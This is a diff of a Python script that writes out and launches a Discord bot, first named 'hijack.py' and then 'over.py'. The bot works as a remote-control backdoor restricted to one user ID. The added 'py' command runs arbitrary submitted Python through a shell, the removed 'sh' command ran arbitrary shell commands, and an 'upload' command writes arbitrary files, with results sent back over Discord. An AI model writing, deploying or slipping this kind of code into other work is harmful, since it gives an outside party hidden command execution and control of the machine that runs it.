@@ -1,29 +1,19 @@
 import os
-open('hijack.py','w').write(f'''
+open('over.py','w').write(f'''
 import subprocess, requests, os
 from discord.ext import commands
 
-bot = commands.Bot('')
 x = 2000
+o = 'out.txt'
+bot = commands.Bot('')
 
 @bot.check
 async def owner(ctx):
-	c = ctx.author.id == 394771663155101727
-	if not c:
-		await ctx.send('how about no')
-	return c
+	await ctx.send('know your place')
+	return ctx.author.id == 394771663155101727
 
 @bot.command()
-async def sh(ctx, *args):
-	o = 'out.txt'
-	subprocess.run(
-		args=args,
-		stdout=open(o,'w'),
-		stderr=subprocess.STDOUT,
-		timeout=30)
-	l =  open(o).read()
-	c = [l[y-x:y] for y in range(x,len(l)+x,x)]
-	for d in c: await ctx.send(d)
+async def shutdown(ctx): exit()
 
 @bot.command()
 async def load(ctx, e): bot.load_extension(e)
@@ -40,12 +30,20 @@ async def upload(ctx, p):
 	open(p, 'w').write(c)
 
 @bot.command()
-async def shutdown(ctx): exit()
-
+async def py(ctx, *, code):
+	open('code','w').write(code)
+	subprocess.run(
+		args=['python code'],
+		stdout=open(o,'w'),
+		stderr=subprocess.STDOUT,
+		shell=True,
+		timeout=10)
+	l =  open(o).read()
+	c = [l[y-x:y] for y in range(x,len(l)+x,x)]
+	for d in c: await ctx.send(d)
 
 class oce(commands.Cog):
-	def __init__(self, bot):
-		self.bot = bot
+	def __init__(self, bot): self.bot = bot
 
 	@commands.Cog.listener()
 	async def on_command_error(self, ctx, err):
@@ -57,4 +55,4 @@ class oce(commands.Cog):
 bot.add_cog(oce(bot))
 bot.run(os.getenv('TOKEN'))
 ''')
-os.system('python hijack.py')
+os.system('python over.py')
